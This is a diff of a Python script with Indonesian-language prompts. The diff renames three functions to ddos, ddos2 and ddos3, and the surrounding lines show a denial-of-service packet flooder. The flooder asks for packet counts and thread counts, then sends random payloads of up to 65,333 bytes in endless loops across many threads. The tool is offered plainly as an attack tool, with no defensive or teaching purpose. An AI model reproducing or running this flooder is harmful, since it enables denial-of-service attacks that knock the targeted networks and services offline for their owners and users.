@@ -31,7 +31,7 @@ times = int(input("PACKETNYA BERAPA | Packet :"))
 threads = int(input("MAU BERAPA LAMA |Threads:"))
 
 os.system("clear")
-def run():
+def ddos():
 	data = random._urandom(1490)
 	i = random.choice(("[•]","[•]","[•]"))
 	while True:
@@ -44,7 +44,7 @@ def run():
 		except:
 			print("\033[94m[*TOK*TOK*] PERMISI PAKET DATENG ")
 
-def run2():
+def ddos2():
 	data = random._urandom(65333)
 	i = random.choice(("[•]","[•]","[•]"))
 	while True:
@@ -59,7 +59,7 @@ def run2():
 			s.close()
 			print("\033[94m[*TOK*TOK*] PERMISI PAKET DATENG ")
 
-def run3():
+def ddos3():
 	data = random._urandom(1800)
 	i = random.choice(("[•]","[•]","[•]"))
 	while True:
@@ -77,9 +77,9 @@ def run3():
 
 for y in range(threads):
 	if choice == 'y':
-		th = threading.Thread(target = run)
+		th = threading.Thread(target = ddos)
 		th.start()
-		th = threading.Thread(target = run2)
+		th = threading.Thread(target = ddos2)
 		th.start()
-		th = threading.Thread(target = run3)
+		th = threading.Thread(target = ddos3)
 		th.start()
